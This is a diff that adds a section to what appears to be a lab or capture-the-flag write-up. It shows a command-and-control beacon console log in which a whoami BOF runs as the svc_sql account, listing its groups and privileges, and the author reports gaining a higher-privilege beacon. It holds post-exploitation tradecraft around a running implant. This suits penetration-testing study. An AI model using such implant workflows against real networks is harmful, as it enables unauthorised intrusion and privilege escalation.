@@ -768,3 +768,44 @@ PS C:\Temp> ./http.x64.exe
 ./http.x64.ex
 ```
 
+![](Pasted%20image%2020260820214558.png)
+
+```python
+[20/08 21:45:00] ethan [c81de896] beacon > whoami
+[20/08 21:45:00] [*] BOF implementation: whoami /all
+[20/08 21:45:03] [*] Agent called server, sent [6.56 Kb]
+[20/08 21:45:03] [+] BOF output
+
+UserName		SID
+====================== ====================================
+darkzero-ext\svc_sql	S-1-5-21-1969715525-31638512-2552845157-1103
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+darkzero-ext\Domain Users                         Group                    S-1-5-21-1969715525-31638512-2552845157-513   Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Certificate Service DCOM Access           Alias                    S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
+SeCreateGlobalPrivilege       Create global objects                             Enabled                       
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
+[20/08 21:45:03] [+] BOF finished
+
++--- Task [c81de896] closed ----------------------------------------------------------+
+```
+
+This now gives me a higher privilege beacon
+
